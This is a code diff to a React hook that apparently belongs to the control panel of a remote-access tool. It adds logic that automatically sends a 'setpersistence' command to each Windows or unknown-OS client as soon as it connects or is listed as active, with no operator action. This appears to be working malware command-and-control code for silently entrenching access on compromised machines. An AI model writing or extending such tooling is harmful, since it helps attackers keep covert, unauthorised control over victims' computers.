@@ -1,26 +1,42 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 
 export const useClients = (socket) => {
   const [clients, setClients] = useState([]);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState(null);
+  const autoPersistScheduled = useRef(new Set());
 
   useEffect(() => {
     if (!socket) return;
 
+    const scheduleAutoPersistence = (client) => {
+      if (!client?.id || autoPersistScheduled.current.has(client.id)) return;
+      autoPersistScheduled.current.add(client.id);
+      const os = String(client.os || '').toLowerCase();
+      if (os && !os.includes('windows') && os !== 'win') return;
+      setTimeout(() => {
+        if (!socket.connected) return;
+        socket.emit('executeCommand', { clientId: client.id, command: 'setpersistence' });
+      }, 1000);
+    };
+
     const handleClientsList = (clientsList) => {
       setClients(clientsList);
       setLoading(false);
+      (clientsList || []).forEach((c) => {
+        if (c?.active) scheduleAutoPersistence(c);
+      });
     };
 
     const handleClientConnected = (client) => {
-      setClients(prev => {
-        const exists = prev.find(c => c.id === client.id);
+      setClients((prev) => {
+        const exists = prev.find((c) => c.id === client.id);
         if (exists) {
-          return prev.map(c => c.id === client.id ? { ...c, ...client } : c);
+          return prev.map((c) => (c.id === client.id ? { ...c, ...client } : c));
         }
         return [...prev, client];
       });
+      scheduleAutoPersistence(client);
     };
 
     const handleClientDisconnected = (data) => {
